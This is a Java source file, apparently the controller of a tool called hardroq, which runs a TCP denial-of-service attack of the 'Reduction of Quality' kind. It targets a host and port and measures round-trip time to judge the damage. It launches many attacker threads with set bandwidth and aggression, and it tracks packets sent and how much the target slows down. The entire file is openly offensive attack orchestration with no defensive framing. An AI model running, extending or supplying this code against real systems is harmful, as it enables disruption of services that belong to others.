package hardroq.controllers;

import hardroq.networking.Ping;
import hardroq.networking.TCPRoQ;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import java.util.Random;

public class AttackController {
	//Singleton Crap
	private static final AttackController _instance = new AttackController();
	private AttackController() {}
	
	//Statics
	public static AttackController getInstance() {
		return _instance;
	}

	//Internals
	private static final Random random = new Random();
	private TCPRoQ[] attackers;
	private String host;
	private int port;
	private int RTT = 0;
	private int startingRTT = 0;
	private String attackHeader = "";
	private String attackFooter = "";
	private float aggressionIndex;
	private float bandwidth;
	private int numThreads;
	private Thread pingThread = new Thread();
	private boolean attacking = false;
	private String[] resources = new String[0];
	
	public void Attack() {
	    //let's strip protocol off of the hostname
	    if (host.contains("://"))
	        host = host.substring(host.indexOf("://") + 3);
	    
		//First, let's start the RTT Pinger to initialize the attack vectors
		attacking  = true;
		startPinging();
		
		while (RTT == 0)
			try {
				Thread.sleep(10);
			} catch (InterruptedException e) {
				System.out.println(e.getMessage());
			}
		
		startingRTT = RTT;	
		
		TCPRoQ.setRTT(RTT);
		
		attackers = new TCPRoQ[numThreads];
		for (int i = numThreads; --i >= 0;) {
			final TCPRoQ a = new TCPRoQ.Builder().host(host).port(port)
					.bandwidth(bandwidth / numThreads).header(attackHeader)
					.footer(attackFooter).aggression(aggressionIndex)
					.build();
			a.InitiateAttack();
			attackers[i] = a;
		}		
	}
	
	public void EndAttack() {
		if (attacking) {
			for (TCPRoQ a : attackers)
				a.EndAttack();
		
			attacking = false;
		}
	}

	private void startPinging() {
		if (!pingThread.isAlive()) {
			pingThread = new Thread(pinger, "Ping Thread");
			pingThread.start();
		}
	}

	private Runnable pinger = new Runnable() {
		@Override
		public void run() {
			while (attacking) {
				try {
					RTT = Ping.HTTPPing(host, port);
					Thread.sleep(2000);
				} catch (Exception e) {
					System.out.println(e.getMessage());
				}
				
				TCPRoQ.setRTT(RTT);
			}
		}
	};
	
	public void LoadResourceList(final File resources) {
		try {
			parseResources(new FileInputStream(resources));
		} catch (Exception e) {
			System.out.println(e.getMessage());
		}
	}
	
	public void LoadResourceList(final URL resources) {
		try {
			URLConnection c = resources.openConnection();
			parseResources(c.getInputStream());
		} catch (Exception e) {
			System.out.println(e.getMessage());
		}
	}
	
	private void parseResources(final InputStream in) throws Exception {
		BufferedReader br = new BufferedReader(new InputStreamReader(in));
		
		String[] arr = new String[0];
		int count = 0;
		
		String line = null;
		while ((line = br.readLine()) != null) {
			//pull off the protocol if there is one
			if (line.startsWith("http://" + host))
				line = line.replace("http://" + host, "");
			
			//make sure we have enough space
			if (count == arr.length) {
				final String[] _newArr = new String[count * 2 + 1];
				System.arraycopy(arr, 0, _newArr, 0, count);
				arr = _newArr;
			}
			
			arr[count++] = line;
		}
		
		//trim the crap
		resources = new String[--count];
		System.arraycopy(arr, 0, resources, 0, count);
	}
	
	public long getPacketCount() {
		long sum = 0;
		if (attackers != null && attackers.length > 0)
			for (TCPRoQ a : attackers)
				if (a != null)
					sum += a.getPacketsSent();
		
		return sum;
	}
	
	public int getCurrentRTT() {
		return RTT;
	}
	
	public void setAttackHeader(final String h) {
		attackHeader = h;
	}
	
	public void setAttackFooter(final String f) {
		attackFooter = f;
	}
	
	public void setAggressionIndex(final int a) {
		final float ai = a / 100.0f;
		aggressionIndex = ai;
	}
	
	public void setBandwidth(final float b) {
		bandwidth = b;
	}
	
	public void setTarget(final String t) {
		//if this is some sort of protocol, we should parse it
		host = t;
	}
	
	public void setPort(final int p) {
		port = p;
	}
	
	public void setNumThreads(final int t) {
		numThreads = t;
	}

	public float getDeltaRTT() {
		return (float) RTT / (float) startingRTT;
	}

	public boolean isAttacking() {
		return attacking;
	}

    public String getRandomResource() {
        return resources[random.nextInt(resources.length)];
    }

    public String getHost() {
        return host;
    }
    
    public int getPort() {
        return port;
    }
}
